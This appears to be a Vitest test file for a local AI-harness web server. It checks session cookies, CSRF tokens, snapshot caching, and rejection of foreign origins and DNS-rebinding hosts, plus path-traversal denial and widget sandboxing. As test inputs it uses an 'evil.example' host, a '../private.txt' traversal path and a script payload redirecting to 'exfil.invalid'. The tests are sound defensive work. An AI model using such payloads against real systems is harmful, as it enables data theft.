import { afterEach, expect, it, vi } from "vitest";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { randomUUID } from "node:crypto";
import { tmpdir } from "node:os";
import { Store } from "../packages/storage/store.ts";
import { Service } from "../packages/core/service.ts";
import { buildServer } from "../apps/server/server.ts";
import { widgetDefinition, widgetDocument } from "../packages/core/widgets.ts";
import { WIDGET_WORKER_CSP } from "../packages/widgets/protocol.ts";
import type { RuntimeAdapter } from "../packages/contracts/index.ts";
const cleanups:(()=>Promise<void>)[]=[];
afterEach(async()=>{for(const cleanup of cleanups.splice(0))await cleanup()});
async function setup(){
 const dir=mkdtempSync(join(tmpdir(),"harness-http-"));const store=new Store(dir);
 const runtime:RuntimeAdapter={configure:()=>{},models:async()=>[],start:async()=>{},followUp:async()=>{},cancel:async()=>{},compact:async()=>{},history:async()=>[],dispose:async()=>{}};
 const service=new Service(store,runtime);const app=await buildServer(service,{port:4317,dev:false});
 cleanups.push(async()=>{await app.close();await service.dispose();store.close();rmSync(dir,{recursive:true,force:true})});
 return {app,service,store};
}
it('routes authenticated model discovery through thread scope and rejects malformed queries',async()=>{
 const {app,service}=await setup(),boot=await app.inject({url:'/api/bootstrap',headers:{host:'127.0.0.1:4317'}}),headers={host:'127.0.0.1:4317',cookie:String(boot.headers['set-cookie']).split(';')[0]},models=vi.spyOn(service,'models').mockResolvedValue([{id:'openai/scoped',provider:'openai',name:'Scoped'}]);
 const result=await app.inject({url:'/api/models?refresh=1&threadId=bound-thread',headers});expect(result.statusCode).toBe(200);expect(result.json().models[0].id).toBe('openai/scoped');expect(models).toHaveBeenCalledWith({refresh:true,threadId:'bound-thread'});
 for(const url of ['/api/models?threadId=','/api/models?threadId=a&threadId=b','/api/models?refresh=no'])expect((await app.inject({url,headers})).statusCode).toBe(400);
 expect((await app.inject({url:'/api/models?threadId=bound-thread',headers:{host:'127.0.0.1:4317'}})).statusCode).toBe(401);
});
it('reuses one serialized snapshot per committed sequence without bypassing authentication or invalidation',async()=>{
 const {app,store}=await setup(),boot=await app.inject({url:'/api/bootstrap',headers:{host:'127.0.0.1:4317'}}),headers={host:'127.0.0.1:4317',cookie:String(boot.headers['set-cookie']).split(';')[0]},snapshot=vi.spyOn(store,'snapshot');
 try {
  const first=await app.inject({url:'/api/snapshot',headers}),second=await app.inject({url:'/api/snapshot',headers});
  expect(first.statusCode).toBe(200);expect(first.headers['content-type']).toContain('application/json');expect(second.body).toBe(first.body);expect(snapshot).toHaveBeenCalledTimes(1);
  expect((await app.inject({url:'/api/snapshot',headers:{host:'127.0.0.1:4317'}})).statusCode).toBe(401);expect(snapshot).toHaveBeenCalledTimes(1);
  store.internal('fixture.change',null,()=>store.put('message','new',null,{id:'new',content:'Fresh committed data'}));
  const next=await app.inject({url:'/api/snapshot',headers});expect(next.json().messages).toEqual([{id:'new',content:'Fresh committed data'}]);expect(snapshot).toHaveBeenCalledTimes(2);
 } finally {snapshot.mockRestore();}
});
it('does not retain a serialized snapshot over the response-cache byte limit',async()=>{
 const {app,store}=await setup(),base=store.snapshot(),snapshot=vi.spyOn(store,'snapshot').mockReturnValue({...base,messages:[{id:'large',threadId:'thread',role:'assistant',content:'x'.repeat(16*1024*1024),runId:null,createdAt:''}]}),boot=await app.inject({url:'/api/bootstrap',headers:{host:'127.0.0.1:4317'}}),headers={host:'127.0.0.1:4317',cookie:String(boot.headers['set-cookie']).split(';')[0]};
 try {for(let n=0;n<2;n++)expect((await app.inject({url:'/api/snapshot',headers})).statusCode).toBe(200);expect(snapshot).toHaveBeenCalledTimes(2);} finally {snapshot.mockRestore();}
});
it("requires a browser session plus CSRF token for mutations",async()=>{
 const {app}=await setup();
 const denied=await app.inject({method:"POST",url:"/api/commands",headers:{host:"127.0.0.1:4317"},payload:{id:"a",type:"thread.create",payload:{}}});
 expect(denied.statusCode).toBe(401);
 const boot=await app.inject({method:"GET",url:"/api/bootstrap",headers:{host:"127.0.0.1:4317"}});
 const cookie=String(boot.headers["set-cookie"]).split(";")[0];const csrf=boot.json().csrfToken;
 const created=await app.inject({method:"POST",url:"/api/commands",headers:{host:"127.0.0.1:4317",cookie,"x-harness-csrf":csrf},payload:{id:"a",type:"thread.create",payload:{title:"Real thread"}}});
 expect(created.statusCode).toBe(200);expect(created.json().result.title).toBe("Real thread");
 const csrfDenied=await app.inject({method:"POST",url:"/api/commands",headers:{host:"127.0.0.1:4317",cookie},payload:{id:"b",type:"thread.create",payload:{}}});
 expect(csrfDenied.statusCode).toBe(403);
});
it('rejects a multibyte CSRF token as forbidden instead of failing the host',async()=>{
 const {app,store}=await setup(),boot=await app.inject({url:'/api/bootstrap',headers:{host:'127.0.0.1:4317'}}),cookie=String(boot.headers['set-cookie']).split(';')[0];
 const result=await app.inject({method:'POST',url:'/api/commands',headers:{host:'127.0.0.1:4317',cookie,'x-harness-csrf':String.fromCharCode(233).repeat(64)},payload:{id:'invalid-csrf',type:'thread.create',payload:{}}});
 expect(result.statusCode).toBe(403);expect(result.json().error.code).toBe('CSRF_REQUIRED');expect(store.all('thread')).toEqual([]);
});
it('bounds valid browser sessions and retains the most recently opened session',async()=>{
 const {app}=await setup(),headers={host:'127.0.0.1:4317'};let first='',last='';
 for(let n=0;n<1001;n++){const result=await app.inject({url:'/api/bootstrap',headers});last=String(result.headers['set-cookie']).split(';')[0];if(!n)first=last;}
 expect((await app.inject({url:'/api/snapshot',headers:{...headers,cookie:first}})).statusCode).toBe(401);
 expect((await app.inject({url:'/api/snapshot',headers:{...headers,cookie:last}})).statusCode).toBe(200);
});
it("rejects foreign origins and DNS rebinding hosts",async()=>{
 const {app}=await setup();
 expect((await app.inject({url:"/api/bootstrap",headers:{host:"evil.example:4317"}})).statusCode).toBe(403);
 expect((await app.inject({url:"/api/bootstrap",headers:{host:"127.0.0.1:4317",origin:"https://evil.example"}})).statusCode).toBe(403);
});
it("serves emitted module workers as JavaScript under nosniff",async()=>{
 const root=resolve('dist/web/assets');mkdirSync(root,{recursive:true});
 const name=`module-worker-${randomUUID()}.mjs`,path=join(root,name);writeFileSync(path,'export const worker=true;',{flag:'wx'});
 cleanups.push(async()=>{rmSync(path,{force:true})});
 const {app}=await setup();const response=await app.inject({url:`/assets/${name}`,headers:{host:'127.0.0.1:4317'}});
 expect(response.statusCode).toBe(200);expect(response.headers['x-content-type-options']).toBe('nosniff');
 expect(response.headers['content-type']).toContain('text/javascript');expect(response.body).toContain('worker=true');
});
it("serves a selected file under a directory grant and denies paths outside it",async()=>{
 const {app,service,store}=await setup();
 const root=mkdtempSync(join(tmpdir(),"harness-export-"));cleanups.push(async()=>{rmSync(root,{recursive:true,force:true})});
 mkdirSync(join(root,"exports"));writeFileSync(join(root,"exports","draft.pdf"),"%PDF-1.7\nfixture");writeFileSync(join(root,"private.txt"),"outside");
 const thread=await service.command({id:"thread",type:"thread.create",payload:{}}) as {result:{id:string}};
 const grant=await service.command({id:"grant",type:"resource.grant",threadId:thread.result.id,payload:{path:join(root,"exports"),kind:"export"}}) as {result:{id:string}};
 const boot=await app.inject({url:"/api/bootstrap",headers:{host:"127.0.0.1:4317"}}),cookie=String(boot.headers["set-cookie"]).split(";")[0];
 const headers={host:"127.0.0.1:4317",cookie};
 const source=await app.inject({url:`/api/resources/${grant.result.id}/content?path=draft.pdf`,headers});
 expect(source.statusCode).toBe(200);expect(source.body).toBe("%PDF-1.7\nfixture");expect(source.headers["content-type"]).toContain("application/pdf");
 const denied=await app.inject({url:`/api/resources/${grant.result.id}/content?path=${encodeURIComponent("../private.txt")}`,headers});
 expect(denied.statusCode).toBe(403);expect(denied.body).not.toContain("outside");expect(store.snapshot().resources).toHaveLength(1);
});
it("serves a credential-free worker asset with independent network and worker denial", async()=>{
 const {app}=await setup();
 const response=await app.inject({url:"/widget-runtime/worker.js",headers:{host:"127.0.0.1:4317"}});
 expect([200,503]).toContain(response.statusCode);
 expect(response.headers["content-security-policy"]).toBe(WIDGET_WORKER_CSP);
 expect(response.headers["x-content-type-options"]).toBe("nosniff");
 if(response.statusCode===200)expect(response.headers["content-type"]).toContain("text/javascript");
});
it("never embeds generated source in the trusted frame document",()=>{
 const widget=widgetDefinition({html:'<script>location="https://exfil.invalid/PRIVATE"</script>',inputSchema:{},eventSchema:{},stateSchema:{}});
 const document=widgetDocument(widget,"artifact");
 expect(document).not.toContain("exfil.invalid");expect(document).not.toContain("PRIVATE");
 expect(document).toContain("Content-Security-Policy");
});
